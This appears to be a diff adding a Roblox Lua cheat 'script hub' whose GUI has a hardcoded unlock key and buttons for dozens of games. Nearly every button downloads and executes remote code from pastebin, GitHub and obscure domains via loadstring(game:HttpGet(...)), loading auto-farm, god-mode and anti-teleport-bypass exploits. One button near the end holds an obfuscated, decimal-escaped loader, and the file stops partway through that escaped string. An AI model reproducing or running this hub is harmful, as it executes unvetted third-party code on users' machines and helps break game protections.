@@ -1,1 +1,795 @@
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/69ef5a8aad862f632521697e52f85445.lua"))()
+local key = 'PSXRAFAGUI93219432'
+local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()
+local win = DiscordLib:Window("Kamlin Hub")
+local serv = win:Server("Kamlin Hub", "")
+local shit = serv:Channel("Key System")
+shit:Textbox('Key', 'Enter Key (Вставить ключ)', true, function(enteredkey)
+    uwuamogus = enteredkey
+end)
+
+shit:Button('Accept (Включить)', function()
+    if uwuamogus ~= key then
+        return game:service'StarterGui':SetCore("SendNotification", {Title = "Cumlin Hub", Text = "Incorrect Key", Duration = 7})
+    end
+    	local library = loadstring(game:HttpGet("https://pastebin.com/raw/UaeJmf6T"))()
+		local venyx = library.new("CumlinHub", 5013109572)
+	    local page1 = venyx:addPage("Games", 5012544693)
+	    
+		local section1 = page1:addSection("Pet Sim X")
+		local section2 = page1:addSection("Shindo Life")
+		local section3 = page1:addSection("YBA")
+		local section4 = page1:addSection("Anime Fighers")
+		local section5 = page1:addSection("Blox Fruits")
+		local section6 = page1:addSection("Abort Me")
+		local section7 = page1:addSection("Bee Swarm Sim")
+		local section8 = page1:addSection("GPO")
+		local section9 = page1:addSection("ABA")
+		local section10 = page1:addSection("ASTD")
+		local section11 = page1:addSection("Jail Break")
+		local section12 = page1:addSection("Saber Simulator")
+		local section13 = page1:addSection("SpeedMan Sim")
+		local section14 = page1:addSection("Bed Wars")
+		local section15 = page1:addSection("King Legacy")
+		local section16 = page1:addSection("Mad City")
+		local section17 = page1:addSection("Da Hood")
+		local section18 = page1:addSection("Arsenal")
+        local section19 = page1:addSection("Strongest Punch")
+		local section20 = page1:addSection("Anime Tappers")
+		local section21 = page1:addSection("Pet Legends")
+		local section22 = page1:addSection("Anime Dimensions")
+		local section23 = page1:addSection("KAT")
+		local section24 = page1:addSection("Legends Of Speed")
+		local section25 = page1:addSection("AUT")
+		local section26 = page1:addSection("Bubble Gum")
+		local section27 = page1:addSection("Russia RP")
+		local section28 = page1:addSection("True Piece")
+		local section29 = page1:addSection("Murder Mystery 2")
+		local section30 = page1:addSection("ATS")
+		local section31 = page1:addSection("Anime Clickers")
+		local section32 = page1:addSection("Weapon Fighting")
+		local section33 = page1:addSection("Clicker Simulator")
+		local section34 = page1:addSection("Demonfall")
+		local section35 = page1:addSection("ABX")
+		local section36 = page1:addSection("APS")
+		local section37 = page1:addSection("3008")
+		local section38 = page1:addSection("Sonic Speed Sim")
+		local section39 = page1:addSection("Mining sim 2")
+		local section40 = page1:addSection("Anime Ddventures")
+		local section41 = page1:addSection("Project Slayers")
+		local section42 = page1:addSection("Doors")
+		local section43 = page1:addSection("Dragon Blox")
+		local section44 = page1:addSection("The Survival Game")
+		local section45 = page1:addSection("Pixel Pice")
+		local section46 = page1:addSection("Arcane Odyssey")
+		local section47 = page1:addSection("My Restaraunt")
+		local section48 = page1:addSection("Project Mugetsu ")
+
+
+		
+		section1:addButton("BEST SCRIPT", function()
+			loadstring(game:HttpGet('https://pastebin.com/raw/fttSzNs8'))()
+		end)
+		
+		section1:addButton("Qwix", function()
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/TSQ-new/QwiX_PSX/main/PSX_SCRIPT'))()
+		end)
+		
+		section1:addButton("Mango hub", function()
+			loadstring(game:HttpGet('https://pastebin.com/raw/ZvRCzL5T'))()
+		end)
+		
+		section1:addButton("Zeerox hub", function()
+			loadstring(game:HttpGet'https://raw.githubusercontent.com/RunDTM/ZeeroxHub/main/Loader.lua')()
+		end)
+		
+		section1:addButton("Project-WD", function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad6196/Project-WD/main/Mainstring.lua"))()
+		end)
+		
+		section1:addButton("LKHUB", function()
+			loadstring(game:HttpGet("https://lkhub.net/s/loader.lua"))()
+		end)
+		
+		section1:addButton("Kidachi", function()
+			loadstring(game:HttpGet('https://kidachi.xyz/loader.html', true))()
+		end)
+		
+		section1:addButton("Cloud Hub", function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/BadScripters/CloudHub/main/hub"))()
+		end)
+		
+		section1:addButton("Milk Up", function()
+			loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a82cd5447cbbc4c7be0e8db405555787.lua"))()
+		end)
+		
+		section1:addButton("EVO V4", function()
+			loadstring(game:HttpGet("https://projectevo.xyz/v4/script.lua", true))();
+		end)
+		
+		section1:addButton("Rafa GUI", function()
+			loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fc715fb43902af268c335a5c7269be5e.lua"))()
+		end)
+	
+		section2:addButton("VG Hub", function()
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
+		end)
+		
+		section2:addButton("Premier hub", function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/cumlin21/premierfree/main/premierfree",true))()
+		end)
+		
+		section2:addButton("Project meow", function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/L1ZOT/Project-PJM/main/shinido"))()
+		end)
+		
+		section2:addButton("Furk", function()
+			loadstring(game:HttpGet("https://pastebin.com/raw/ViaLjeuJ",true))()
+		end)
+		
+		section2:addButton("Snow", function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/cumlin21/snowhu/main/snoww", true))()
+		end)
+		
+		section2:addButton("Vellerius", function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/Corrupt2625/Revamps/main/SpyHub.lua"))()
+		end)
+		
+		section3:addButton("HISTORIA", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Historia00012/HISTORIAHUB/main/Histyhubb"))()
+		end)
+		
+		section3:addButton("YBA HACK", function()
+            loadstring(game:HttpGet"https://raw.githubusercontent.com/NukeVsCity/hackscript123/main/gui")()
+		end)
+		
+		section3:addButton("NexHub", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/CopyReal/NexHub/main/NexHubLoader"))()
+		end)
+		
+		section3:addButton("Rayla", function()
+            loadstring(game:HttpGet'https://raw.githubusercontent.com/RaylasHub/unusual/main/Rayla\'s%20Hub.lua')()
+		end)
+		
+		section3:addButton("YBA-GUI-Rewrite", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Tobias020108Back/YBA-AUT/main/YBA-GUI-Rewrite.lua"))() 
+		end)
+		
+		section3:addButton("Anti Teleport Bypass", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Ternich/rbxscript/main/YourBizarreAdventure[AntiTeleportBypass]"))() 
+		end)
+		
+		section3:addButton("GOD MODE", function()
+            loadstring(game:HttpGet('https://pastebin.com/raw/331ErGk4'))()
+		end)
+		
+		section3:addButton("bitch boy", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/zakater5/LuaRepo/main/YBA/MainGui.lua"))()
+		end)
+		
+		section3:addButton("bitch boy v3", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/zakater5/LuaRepo/main/YBA/v3.lua"))()
+		end)
+		
+		section3:addButton("CuHub", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ItachiPvPUchiha/CuHub/main/yba.lua"))()
+		end)
+		
+		section3:addButton("Death", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/93TfDRcN"))()
+		end)
+		
+		section3:addButton("Kolgie", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/kolgie/YBA-GUI/main/yba-gui-obfuscated.lua"))()
+		end)
+		
+		section3:addButton("bitch boy v2", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/zakater5/LuaRepo/main/YBA/v2.lua"))()
+		end)
+		
+		section4:addButton("Code-Fludex", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Code-Fludex/Lua-Scripts/main/AnimeFightersSim.lua"))()
+		end)
+		
+		section4:addButton("obeseinsect", function()
+            loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/obeseinsect/roblox/main/Games/Anime%20Fighters%20Sim/AFS.lua"))()
+		end)
+		
+		section4:addButton("KJ HUB", function()
+            loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/KiJinGaming/FreeScript/main/KJHub.lua"))();
+		end)
+		
+		section4:addButton("pspboy08", function()
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/pspboy08/dollhouse/main/AFSGUI.lua')))()
+		end)
+		
+		section4:addButton("Zer0Hub", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Discord0000/Zer0Hub/main/GameScripts/6299805723.lua"))()
+		end)
+
+		section5:addButton("Nub Hub", function()
+            loadstring(game:HttpGet('https://rawscripts.net/raw/UPDATE-16-Blox-Fruits-Nub-V1-Hub-4583'))()
+		end)
+		
+		section5:addButton("GUI 1", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/KmjarUz5", true))()
+		end)
+		
+		section5:addButton("RIPPER-HUB", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/hajibeza/RIPPER-HUB/main/RIPPERHUBV2.lua"))()
+		end)
+		
+		section5:addButton("xDepressionx", function()
+            loadstring(game:HttpGet"https://raw.githubusercontent.com/xDepressionx/Free-Script/main/AllScript.lua")()
+		end)
+		
+		section5:addButton("Sea Hub", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/AltsegoD/scripts/egoD/tablekhoc.lua"))()
+		end)
+		
+		section5:addButton("Neva Hub", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2'))()
+		end)
+		
+		section5:addButton("LuaQLeak", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/Blox-Fruits-UpdateV1"))()
+		end)
+		
+		section5:addButton("SMZHUB", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Frerfgzz/free-script/main/SMZHUBv2BETA"))()
+		end)
+		
+		section5:addButton("Nub.xyz", function()
+            loadstring(game:HttpGet('https://rawscripts.net/raw/UPDATE-16-Blox-Fruits-Nub-V1-Hub-4583'))()
+		end)
+		
+		section5:addButton("CFrame Hub", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Steveee11/Scripts/main/Blox%20Fruits%20OP%20Script"))()
+		end)
+		
+		section5:addButton("SKYAS HUB", function()
+            loadstring(game:HttpGet('https://gitlab.com/L1ZOT/skays-hub/-/raw/main/Script/2753915549/Script.lua'))()
+		end)
+		
+		section5:addButton("Beanhub", function()
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/SoyElPekka/BeanHub/main/BloxFruitsPc'),true))()
+		end)
+		
+		section5:addButton("SpeedHub", function()
+            loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ahmadsgamer2/Script--Game/main/Script%20Game"))()
+		end)
+		
+		section5:addButton("TurboHub", function()
+            loadstring(Game:HttpGet"https://gitlab.com/turbohubz/loader.xyz/loader/-/raw/main/TurboHub-Loader")()
+		end)
+		
+		section5:addButton("Zaque Hub", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Mei2232/ZaqueHub/main/Zaque%20Hub"))()
+		end)
+		
+		section5:addButton("hxllow hub", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/Hxllow%20Hub", true))()
+		end)
+		
+		section5:addButton("Atomic Hub", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ArceusXHub/atomic-hub/main/atomic-hub.lua"))()
+		end)
+
+		section6:addButton("blox hub", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/M6ADgwqC", true))()
+		end)
+		
+		section6:addButton("NocturneMoDz", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/NocturneMoDz/ADOPT-ME-/main/SCRIPT",true))()
+		end)
+		
+		section6:addButton("Antarctic-Hub", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/JusticeValley/Antarctic-Hub/main/New.lua", true))()
+		end)
+		
+		section6:addButton("Antarctic-Hub", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/JusticeValley/Antarctic-Hub/main/New.lua", true))()
+		end)
+		
+		section7:addButton("XLP", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/not-weuz/Lua/main/bsstrainer.lua"))()
+		end)
+		
+		section7:addButton("HISTORIA HUB", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Historia00012/HISTORIAHUB/main/BSS%20FREE"))()
+		end)
+		
+		section7:addButton("AltsegoD", function()
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/AltsegoD/script/master/BeeSwarmSimulator.lua')))()
+		end)
+		
+		section7:addButton("NEW", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/6pV04LhP", true))()
+		end)
+		
+		section7:addButton("MheeHub", function()
+            loadstring(game:HttpGetAsync(("https://pastebin.com/raw/KSpGSvQg")))()
+		end)
+		
+		section7:addButton("kocmoc", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/not-weuz/Lua/main/kocmoc.lua"))()
+		end)
+		
+		section7:addButton("Cloud Hub", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/BadScripters/CloudHub/main/hub"))()
+		end)
+		
+		section8:addButton("GUI 1", function()
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Jakekill871/public-scripts/master/GrandPieceOnlineGUI'),true))()
+		end)
+		
+		section8:addButton("GUI 2", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/CFA-HUB/CFA-HUB/main/cfahubfree.lua"))()
+		end)
+		
+		section8:addButton("GUI 3", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/ArponAG/Scripts/main/gpo.lua', true))()
+		end)
+		
+		section8:addButton("GUI 4", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/cumlin21/goi/main/er', true))()
+		end)
+		
+		section8:addButton("GUI 5", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/CFA-HUB/CFA-HUB/main/cfahubfree.lua', true))()
+		end)
+		
+		section8:addButton("GUI 6 Lunar", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/0xRinFin/GPO/main/Lunar%20Hub%20GPO%20FREE.lua"))()
+		end)
+		
+		section9:addButton("AVA GUI HACK", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/travislmao/pub-scripts/main/abagui", true))()
+		end)
+		
+		section10:addButton("ASTD GUI HACK", function()
+            loadstring(game:HttpGet("http://assasine.com/Scripts/All%20Star%20Tower%20Defense.lua", true))()
+		end)
+		
+		section10:addButton("KarmaPanda", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/KarmaPanda/Roblox/main/astd-aio.lua'))()
+		end)
+		
+		section11:addButton("solarishub", function()
+            loadstring(game:HttpGet('https://solarishub.dev/script.lua',true))()
+		end)
+		
+		section11:addButton("Vynixius", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Jailbreak/Jailbreak"))()
+		end)
+		
+		section11:addButton("alohabeach", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/alohabeach/Main/master/Scripts/JailbreakAutoRob.lua"))()
+		end)
+		
+		section11:addButton("AstraeaDemo", function()
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Jakekill871/public-scripts/master/AstraeaDemo'),true))()
+		end)
+		
+		section12:addButton("SS GUI", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/JQPzcZH4"))()
+		end)
+		
+		section13:addButton("AnonymousErrors", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/AnonymousErrors/newscripts/main/speedmansim.lua%22"))()
+		end)
+		
+	    section15:addButton("koio08199za", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/koio08199za/King-Legacy-/main/NOOB20HUB.Lua"))()
+		end)
+		
+		section15:addButton("acsu123", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
+
+		end)
+		
+		section15:addButton("SkyHubCrack", function()
+            loadstring(game:HttpGet(("https://raw.githubusercontent.com/TyCollor/S2QCrack/main/SkyHubCrack/KingLegacy"),true))()
+		end)
+		
+		section15:addButton("AltsegoD", function()
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/AltsegoD/script/master/KingPiece.lua')))()
+		end)
+		
+		section16:addButton("MONEY FARM", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptRUs/Banana/main/MadCityFast.lua", true))()
+		end)
+		
+		section16:addButton("TurkOyuncu99", function()
+            loadstring(game:HttpGet("https://gist.githubusercontent.com/TurkOyuncu99/811e25ec8cfcdaa9ae7026353288783c/raw/4b073a5c1a0a4e2ed7e2304c2e769eb440a371a9/h", true))()  
+		end)
+		
+		section16:addButton("Mad City GUI", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/UqwRSk1Q"))() 
+		end)
+		
+		section16:addButton("jayhub", function()
+            loadstring(game:HttpGet("https://jack1214060.xyz/jayhub",true))()
+		end)
+		
+		section17:addButton("Da Hood GUI", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptedScripts/script/main/DaHood", true))()
+		end)
+		
+		section17:addButton("Biteyz", function()
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/Biteyz/Smoke/main/source')))()
+		end)
+		
+		section17:addButton("zordion", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/zordion/main/script.lua"))()
+		end)
+		
+		section18:addButton("V.G-Hub", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
+		end)
+		
+		section18:addButton("Allinity", function()
+            loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Allinity/Scripts/main/Arsenal.lua"))()
+		end)
+		
+		section19:addButton("Solx69", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/Solx69/Shit-Boy-Hub-Main/main/Master.lua'))();
+		end)
+		
+		section20:addButton("Manahub", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Mana42138/Manahub-Script-Hyper-804-was-here.lua/main/Hyper-is-still-here.lua"))()
+		end)
+		
+		section20:addButton("Extras", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/SenseiJoshy/Extras/main/Anime%20Tappers.lua"))()
+		end)
+		
+		section21:addButton("naypramx", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/naypramx/Simulator/Script/PetLegends"))()
+		end)
+		
+		section22:addButton("NexHub", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/CopyReal/NexHub/main/NexHubLoader"))()
+		end)
+		
+		section22:addButton("Solx69", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/Solx69/Shit-Boy-Hub-Main/main/Master.lua'))();
+		end)
+		
+		section23:addButton("KAT GUI HACK", function()
+            loadstring(game:HttpGet('http://cattoware.tk/main.lua'))()
+		end)
+		
+		section23:addButton("zReal-King", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/zReal-King/Knife-Ability-Test/main/Gui" ))()
+		end)
+		
+		section23:addButton("KAT GUI", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/6rd91GZx", true))()
+		end)
+		
+		section24:addButton("ghostclientmain", function()
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/bananabruhwhat101/ghostclientmain/main/ghostclienthub.lua'),true))()
+		end)
+		
+		section25:addButton("GUI 1", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/GodClass/EpicScripts/main/AUT%20GUI"))()
+		end)
+		
+		section25:addButton("GUI 2", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/sannin9000/scripts/main/aut.lua"))()
+		end)
+		
+		section25:addButton("GUI 3", function()
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/alfiebgtbhgh/CrusaderHub/main/Main.lua'),true))()
+		end)
+		
+		section25:addButton("GUI 4", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ewyzu/Spotify-Scripts/main/A-Universal-Time"))()
+		end)
+		
+		section25:addButton("GUI 5 Spotify Hub", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ewyzu/Spotify-Scripts/main/A-Universal-Time"))()
+		end)
+		
+		section25:addButton("GUI 6 by Death", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/UGL003wn"))()
+		end)
+		
+		section26:addButton("Luftwaffe-dotcom", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Luftwaffe-dotcom/a/main/Bubble%20Gum%20Sim",true))()
+		end)
+		
+		section26:addButton("Mstir16", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/Mstir16/special-stuff/main/special%20code%204'))()
+		end)
+		
+		section26:addButton("Bytes Cool", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/0rLVTifE"))()
+		end)
+		
+		section27:addButton("blurhub", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/blurhub1/script1/main/hub'))()
+		end)
+		
+		section28:addButton("hyper", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Shisobad/new/main/script.lua"))()
+		end)
+		
+		section29:addButton("MM2 GUI", function()
+            loadstring(game:HttpGet("pastebin.com/MZaJmWL1", true))()
+		end)
+		
+		section29:addButton("AlphaX", function()
+            loadstring(game:HttpGet("https://www.logixism.tech/AlphaX/loader.lua", true))() 
+		end)
+		
+		section29:addButton("MM2EmoteGUI", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/carter-fr/MM2EmoteGUI/main/script.lua"))() 
+		end)
+		
+		section29:addButton("Xeny Ware", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/CHdpzEP9"))()
+		end)
+		
+		section29:addButton("jayhub", function()
+            loadstring(game:HttpGet("https://jack1214060.xyz/jayhub",true))()
+		end)
+		
+		section29:addButton("solarishub", function()
+            loadstring(game:HttpGet('https://solarishub.dev/script.lua',true))()
+		end)
+		
+		section29:addButton("V.G-Hub", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
+		end)
+		
+		section29:addButton("EclipseMM2", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Ethanoj1/EclipseMM2/master/Script", true))()
+		end)
+		
+		section29:addButton("Kidachi", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/KidichiHB/Kidachi/main/Scripts/MM2", true))() 
+		end)
+		
+		section30:addButton("Ahegao-Hub", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/HimikoToga1474/Ahegao-Hub/master/Main.Lua"))()
+		end)
+		
+		section31:addButton("animeclicker", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/Wi5rjvDD"))()
+		end)
+		
+		section32:addButton("WFS GUI", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/Bd6R0GaC"))()
+		end)
+		
+		section32:addButton("WFS GUI 2", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Kederal/script.gg/main/loader.lua"))()
+		end)
+		
+		section32:addButton("WFS GUI 3", function()
+            loadstring(game:HttpGet(("https://aizen.ml/uploads/wfs.txt")))()
+		end)
+		
+		section32:addButton("WFS GUI 4", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/Bd6R0GaC"))()
+		end)
+		
+		section32:addButton("WFS GUI 4", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/Bd6R0GaC"))()
+		end)
+		
+		section32:addButton("WFS GUI 5", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ZaRdoOx/weapon-figting/main/Weapon-Fighting-Simulator"))()
+		end)
+		
+		section32:addButton("WFS GUI  6", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ZaRdoOx/weapon-figting/main/Weapon-Fighting-Simulator"))()
+		end)
+		
+		section32:addButton("WFS GUI  7", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Kederal/script.gg/main/loader.lua"))()
+		end)
+		
+		section33:addButton("CS GUI 1", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ExtremeAntonis/KeySystemUI/main/KeySystemUI-Obfuscated.lua"))()
+		end)
+		
+		section33:addButton("CS GUI 2", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/LeoKholYt/roblox/main/clicker_simulator.lua",true))()
+		end)
+		
+		section34:addButton("DF GUI 1", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/ghost-home/public/main/demonfall.lua', true))()
+		end)
+		
+		section34:addButton("DF GUI 2", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/LeadMarker/OpenSource/main/Demonfall.lua"))()
+		end)
+		
+		section34:addButton("DF GUI 4", function()
+            loadstring(game:HttpGet('https://ghosthome.creativehell.xyz/Public/demonfall.txt', true))() 
+		end)
+		
+		section34:addButton("DF GUI 5", function()
+            loadstring(game:HttpGet("https://senseijoshy.com/Loader.lua"))() 
+		end)
+		
+		section35:addButton("ABX GUI ", function()
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/ttd1108/Script/master/animebattle'), true))()
+		end)
+		
+		section36:addButton("APS GUI 1 ", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Whybiee/Roblox-scripts/main/Anime%20Punching%20Simulator.lua"))()
+		end)
+		
+		section36:addButton("APS GUI 2 ", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/aU4ZEikj"))()
+		end)
+		
+		section37:addButton("3008 ", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/BaconLords/shit-with-sugar/main/Bacon%20Hub%20Main%20Loader'))()
+		end)
+		
+		section38:addButton("exp farm ", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/kkeyy-hash/roblox/main/SonicSpeedSimulator.lua'))()
+		end)
+		
+		section38:addButton("16k coins per hour ", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/kkeyy-hash/roblox/main/SonicSpeedSimulator2.lua'))()
+		end)
+		
+		section38:addButton("GUI 1 ", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Sonic%20Speed%20Simulator/main.lua", true))()
+		end)
+		
+		section38:addButton("GUI 2 ", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Luciquad/credit/main/sonicspeedsimulator.lua"))()
+		end)
+		
+		section38:addButton("GUI 3 ", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/destylol/masterhubv311/itachi/Main.lua"))()
+		end)
+		
+		section39:addButton("GUI 1 Zeerox ", function()
+            loadstring(game:HttpGet'https://raw.githubusercontent.com/RunDTM/ZeeroxHub/main/Loader.lua')()
+		end)
+		
+		section39:addButton("GUI 2 Kelphub ", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/MaGiXxScripter/Cum-Hub/main/loader'))()
+		end)
+		
+		section39:addButton("GUI 3 ", function()
+            loadstring(game:HttpGet("https://system-exodus.com/scripts/MiningSimulator/MiningSimulator2.lua", true))()
+		end)
+		
+		section39:addButton("GUI 4 ", function()
+            loadstring(game:HttpGet("https://script.vestrahub.xyz"))()
+		end)
+		
+		section40:addButton("GUI 1 ", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/borntodiekuv/KeybrewHub/main/AA"))()
+		end)
+		
+		section40:addButton("GUI 2 ", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ArponAG/Scripts/main/AnimeAdventures.lua"))()
+		end)
+		
+		section41:addButton("GUI 1 ", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/MqCGKGXH"))()
+		end)
+		
+		section41:addButton("GUI 2 ", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/borntodiekuv/KeybrewHub/main/Main"))()
+		end)
+		
+		section41:addButton("GUI 3 ", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/master/new"))()
+		end)
+		
+		section41:addButton("C ", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/master/new"))()
+		end)
+		
+		section42:addButton("GUI 1 ", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Doors/Script.lua"))()
+		end)
+		
+		section42:addButton("GUI 2 ", function()
+            loadstring("\103\97\109\101\46\83\116\97\114\116\101\114\71\117\105\58\83\101\116\67\111\114\101\40\34\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110\34\44\32\123\10\32\32\32\32\84\105\116\108\101\32\61\32\34\71\97\109\101\115\32\72\117\98\32\86\53\34\59\10\32\32\32\32\84\101\120\116\32\61\32\34\83\117\98\115\99\114\105\98\101\32\116\111\32\84\97\107\101\32\77\111\100\122\122\34\59\32\45\45\32\119\104\97\116\32\116\104\101\32\116\101\120\116\32\115\97\121\115\32\40\111\102\99\41\10\32\32\32\32\68\117\114\97\116\105\111\110\32\61\32\53\59\10\125\41\10\103\97\109\101\46\83\116\97\114\116\101\114\71\117\105\58\83\101\116\67\111\114\101\40\34\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110\34\44\32\123\10\32\32\32\32\84\105\116\108\101\32\61\32\34\67\114\101\100\105\116\115\32\84\111\32\65\100\118\97\110\99\101\70\97\108\108\105\110\103\34\59\10\32\32\32\32\84\101\120\116\32\61\32\34\83\117\98\115\99\114\105\98\101\32\116\111\32\89\101\108\108\111\119\71\114\101\103\80\114\111\103\114\97\109\34\59\32\45\45\32\119\104\97\116\32\116\104\101\32\116\101\120\116\32\115\97\121\115\32\40\111\102\99\41\10\32\32\32\32\68\117\114\97\116\105\111\110\32\61\32\53\59\10\125\41\10\10\108\111\99\97\108\32\107\97\118\111\85\105\32\61\32\108\111\97\100\115\116\11